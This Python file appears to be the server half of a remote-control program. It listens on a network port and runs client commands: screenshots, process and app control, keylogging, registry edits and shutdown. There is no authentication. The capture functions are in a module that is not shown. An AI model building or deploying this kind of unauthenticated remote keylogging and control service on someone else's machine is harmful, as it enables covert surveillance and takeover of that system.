import ServerAction as svac
import Util

import socket

SERVER_PORT = 9098
SERVER_ADDRESS = socket.gethostbyname(socket.gethostname())

s = socket.socket()
s.bind((SERVER_ADDRESS, SERVER_PORT))
s.listen()


while True:
    # Wait for client connection
    conn, _ = s.accept()

    while True:
        # Message received from socket
        client_message = conn.recv(2 ** 16)
        if len(client_message) == 0:
            break

        # Extract the received message
        (command, option, client_data) = Util.extract_message(client_message, message_type='client')

        error_code = 0
        server_data = ""

        # Check the command variable for task
        if command == 'screenshot':
            (error_code, server_data) = svac.action_screenshot(option, client_data)
        elif command == 'process':
            (error_code, server_data) = svac.action_process(option, client_data)
        elif command == 'app':
            (error_code, server_data) = svac.action_app(option, client_data)
        elif command == 'keylogging':
            (error_code, server_data) = svac.action_keylogging(option, client_data)
        elif command == 'reg':
            (error_code, server_data) = svac.action_reg(option, client_data)
        elif command == 'shutdown':
            (error_code, server_data) = svac.action_shutdown(option, client_data)
        elif command == 'disconnect':
            break
        else:
            error_code = 3 # Unrecognized command

        # Look up for error message from predefined dictionary
        error_message = Util.error_message_dictionary[error_code]

        # Create message
        server_message = Util.package_message(error_code, error_message, server_data)

        # Send message
        conn.send(server_message)
